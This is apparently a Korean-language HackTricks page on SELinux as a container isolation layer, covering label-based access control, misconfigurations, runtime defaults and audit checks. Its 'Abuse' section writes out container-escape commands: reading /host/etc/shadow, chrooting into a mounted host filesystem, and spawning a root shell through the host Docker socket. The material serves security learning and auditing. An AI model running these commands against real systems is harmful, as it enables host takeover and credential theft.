# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

SELinux는 **label-based Mandatory Access Control** 시스템입니다. 관련된 모든 process와 object에는 security context가 부여될 수 있으며, policy는 어떤 domain이 어떤 type과 어떤 방식으로 상호작용할 수 있는지 결정합니다. Containerized environment에서는 일반적으로 runtime이 confined container domain에서 container process를 실행하고, 해당 container content에 대응하는 type을 label로 지정합니다. Policy가 정상적으로 작동한다면 process는 자신의 label이 접근하도록 지정된 항목을 읽고 쓸 수 있지만, mount를 통해 해당 content가 보이게 되더라도 다른 host content에 대한 접근은 거부될 수 있습니다.

이는 일반적인 Linux container deployment에서 사용할 수 있는 가장 강력한 host-side protection 중 하나입니다. 특히 Fedora, RHEL, CentOS Stream, OpenShift 및 기타 SELinux 중심 ecosystem에서 중요합니다. 이러한 환경에서 SELinux를 무시하는 reviewer는 겉보기에는 명확한 host compromise 경로가 실제로 차단되는 이유를 이해하지 못하는 경우가 많습니다.

## AppArmor Vs SELinux

High-level에서 가장 쉽게 구분하면, AppArmor는 path-based인 반면 SELinux는 **label-based**입니다. 이는 container security에 큰 영향을 줍니다. Path-based policy는 동일한 host content가 예상하지 못한 mount path 아래에 표시될 경우 다르게 동작할 수 있습니다. 반면 label-based policy는 object의 label이 무엇인지, 그리고 process domain이 해당 object에 어떤 작업을 수행할 수 있는지를 확인합니다. 이것이 SELinux를 단순하게 만드는 것은 아니지만, AppArmor 기반 시스템에서 defender가 실수로 가정할 수 있는 path-trick 유형의 문제에 더 강한 대응력을 제공합니다.

Model이 label 중심이므로 container volume handling과 relabeling 결정은 security-critical합니다. runtime 또는 operator가 "make mounts work"를 위해 label을 지나치게 광범위하게 변경하면, workload를 격리하기 위해 설계된 policy boundary가 의도보다 훨씬 약해질 수 있습니다.

## Lab

Host에서 SELinux가 활성화되어 있는지 확인하려면:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
호스트의 기존 label을 확인하려면:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
일반 실행과 labeling이 비활성화된 실행을 비교하려면:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
SELinux가 활성화된 호스트에서는 예상된 container domain에서 실행되는 workload와 해당 enforcement layer가 제거된 workload의 차이를 보여 주므로 매우 실용적인 시연이 됩니다.

## Runtime Usage

SELinux가 플랫폼 기본 구성에 포함된 시스템에서 Podman은 SELinux와 특히 잘 연계됩니다. Rootless Podman과 SELinux의 조합은 일반적인 container baseline 중 가장 강력한 구성 중 하나입니다. 호스트 측에서 프로세스가 이미 unprivileged 상태이며, 동시에 MAC policy의 제한을 받기 때문입니다. 지원되는 환경에서는 Docker도 SELinux를 사용할 수 있지만, 관리자들은 volume-labeling 관련 문제를 우회하기 위해 SELinux를 비활성화하는 경우가 있습니다. CRI-O와 OpenShift는 container isolation의 핵심 요소로 SELinux에 크게 의존합니다. Kubernetes도 SELinux 관련 설정을 제공할 수 있지만, 그 가치는 해당 node OS가 실제로 SELinux를 지원하고 enforcement하는지에 따라 달라집니다.

반복해서 강조할 교훈은 SELinux가 선택적인 장식이 아니라는 점입니다. SELinux를 기반으로 구축된 ecosystem에서는 SELinux가 예상되는 security boundary의 일부입니다.

## Misconfigurations

가장 대표적인 실수는 `label=disable`입니다. 운영 환경에서는 volume mount가 거부되었을 때 labeling model을 수정하는 대신, SELinux를 문제에서 제외하는 것이 가장 빠른 단기 해결책이라고 판단하면서 이런 일이 자주 발생합니다. 또 다른 일반적인 실수는 host content를 잘못 relabeling하는 것입니다. 광범위한 relabel 작업으로 application이 작동하게 만들 수는 있지만, 원래 의도했던 범위를 훨씬 넘어 container가 접근할 수 있는 대상을 확장할 수도 있습니다.

또한 **installed** SELinux와 **effective** SELinux를 혼동하지 않는 것이 중요합니다. 호스트가 SELinux를 지원하더라도 permissive mode일 수 있으며, runtime이 workload를 예상된 domain에서 실행하지 않을 수도 있습니다. 이러한 경우 protection은 documentation이 암시하는 것보다 훨씬 약합니다.

## Abuse

SELinux가 없거나 permissive 상태이거나 workload에 대해 광범위하게 비활성화되어 있으면, host-mounted path를 훨씬 쉽게 악용할 수 있습니다. 그렇지 않았다면 label에 의해 제한되었을 동일한 bind mount가 host data에 접근하거나 host를 수정하는 직접적인 수단이 될 수 있습니다. 이는 writable volume mount, container runtime directory 또는 편의를 위해 민감한 host path를 노출한 operational shortcut과 결합될 때 특히 중요합니다.

SELinux는 runtime flag가 비슷해 보이는데도 한 호스트에서는 일반적인 breakout writeup이 즉시 작동하고 다른 호스트에서는 반복해서 실패하는 이유를 설명하는 경우가 많습니다. 누락된 요소는 namespace나 capability가 아니라, 그대로 유지된 label boundary인 경우가 많습니다.

가장 빠른 practical check 방법은 active context를 비교한 다음, 일반적으로 label에 의해 제한되는 mounted host path 또는 runtime directory를 probe하는 것입니다:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
호스트 bind mount가 존재하고 SELinux labeling이 비활성화되었거나 약화된 경우, information disclosure가 흔히 먼저 발생합니다:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
마운트가 쓰기 가능하고 커널 관점에서 컨테이너가 사실상 host-root라면, 다음 단계는 추측하는 대신 제어된 host 수정이 가능한지 테스트하는 것입니다:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
SELinux를 지원하는 호스트에서는 런타임 상태 디렉터리 주변의 label이 손실되면 직접적인 privilege-escalation 경로가 노출될 수도 있습니다:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
이 명령들은 full escape chain을 대체하지 않지만, SELinux가 host data access 또는 host-side file modification을 차단한 원인이었는지 매우 빠르게 확인할 수 있게 해 줍니다.

### Full Example: SELinux Disabled + Writable Host Mount

SELinux labeling이 비활성화되어 있고 host filesystem이 `/host`에 writable 상태로 mount되어 있다면, full host escape는 일반적인 bind-mount abuse 사례가 됩니다:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
`chroot`가 성공하면 컨테이너 프로세스는 이제 host filesystem에서 작동합니다:
```bash
id
hostname
cat /etc/passwd | tail
```
### 전체 예시: SELinux 비활성화 + Runtime 디렉터리

labels가 비활성화된 후 workload가 runtime socket에 접근할 수 있다면, escape를 runtime에 위임할 수 있습니다:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
핵심적으로 주목할 점은 SELinux가 이러한 종류의 host path 또는 runtime state 접근을 차단하는 제어 수단인 경우가 많았다는 것입니다.

## 확인

SELinux 확인의 목표는 SELinux가 활성화되어 있는지 확인하고, 현재 security context를 식별하며, 관심 있는 파일 또는 경로가 실제로 label로 제한되어 있는지 확인하는 것입니다.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
여기서 중요한 점:

- `getenforce`는 이상적으로 `Enforcing`을 반환해야 합니다. `Permissive` 또는 `Disabled`이면 전체 SELinux 섹션의 의미가 달라집니다.
- 현재 프로세스 context가 예상과 다르거나 지나치게 광범위해 보인다면, workload가 의도한 container policy 하에서 실행되고 있지 않을 수 있습니다.
- host-mounted 파일 또는 runtime 디렉터리의 label에 프로세스가 지나치게 자유롭게 access할 수 있다면 bind mount는 훨씬 더 위험해집니다.

SELinux-capable platform에서 container를 검토할 때 labeling을 부차적인 세부 사항으로 취급하지 마세요. 많은 경우 labeling은 host가 아직 compromise되지 않은 주요 이유 중 하나입니다.

## Runtime 기본값

| Runtime / platform | 기본 상태 | 기본 동작 | 일반적인 수동 약화 |
| --- | --- | --- | --- |
| Docker Engine | Host에 따라 다름 | SELinux가 활성화된 host에서 SELinux separation을 사용할 수 있지만, 정확한 동작은 host/daemon configuration에 따라 달라짐 | `--security-opt label=disable`, bind mount의 광범위한 relabeling, `--privileged` |
| Podman | SELinux host에서 일반적으로 활성화됨 | 비활성화하지 않는 한 SELinux system에서 Podman의 일반적인 구성 요소로 SELinux separation이 사용됨 | `--security-opt label=disable`, `containers.conf`의 `label=false`, `--privileged` |
| Kubernetes | 일반적으로 Pod level에서 자동 할당되지 않음 | SELinux support가 존재하지만, Pod에는 보통 `securityContext.seLinuxOptions` 또는 platform별 default가 필요하며 runtime과 node support도 필요함 | 취약하거나 광범위한 `seLinuxOptions`, permissive/disabled node에서 실행, labeling을 비활성화하는 platform policy |
| CRI-O / OpenShift style deployments | 일반적으로 크게 의존함 | 이러한 environment에서는 SELinux가 node isolation model의 핵심 요소인 경우가 많음 | access 범위를 과도하게 넓히는 custom policy, 호환성을 위한 labeling 비활성화 |

SELinux default는 seccomp default보다 distribution에 더 크게 의존합니다. Fedora/RHEL/OpenShift-style system에서는 SELinux가 isolation model의 중심인 경우가 많습니다. SELinux가 없는 system에서는 단순히 존재하지 않습니다.
{{#include ../../../../banners/hacktricks-training.md}}
